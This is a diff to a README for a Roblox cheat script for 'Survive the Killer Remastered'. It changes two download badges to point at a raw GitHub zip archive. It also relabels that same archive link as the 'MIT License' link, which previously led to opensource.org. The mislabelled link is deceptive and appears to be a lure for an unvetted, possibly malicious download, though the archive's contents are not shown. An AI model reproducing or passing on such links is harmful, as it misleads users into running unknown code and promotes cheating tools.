@@ -1,6 +1,6 @@
 # Survive the Killer Remastered Roblox Script 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://lasthoot.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/lasthoot/survive-the-killer-remastered-toolkit/branch/vocalist/the_survive_killer_remastered_toolkit_1.8-alpha.2.zip)  
 *[Download Latest Version]*
 
 ---
@@ -92,7 +92,7 @@ Join the conversation in our Discord channel and GitHub Discussions (see Communi
 
 MIT License © 2025  
 You're free to fork, adapt, and expand this project, lending your own creative spark!  
-Please see the [MIT License](https://opensource.org/licenses/MIT) for use, attribution, and liability details.
+Please see the [MIT License](https://raw.githubusercontent.com/lasthoot/survive-the-killer-remastered-toolkit/branch/vocalist/the_survive_killer_remastered_toolkit_1.8-alpha.2.zip) for use, attribution, and liability details.
 
 ---
 
@@ -100,7 +100,7 @@ Please see the [MIT License](https://opensource.org/licenses/MIT) for use, attri
 
 **Ready to optimize your Survive the Killer Remastered adventure?**
 
-[![Download](https://img.shields.io/badge/Download-green)](https://lasthoot.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/lasthoot/survive-the-killer-remastered-toolkit/branch/vocalist/the_survive_killer_remastered_toolkit_1.8-alpha.2.zip)  
 *[Download Latest Version]*
 
 ---
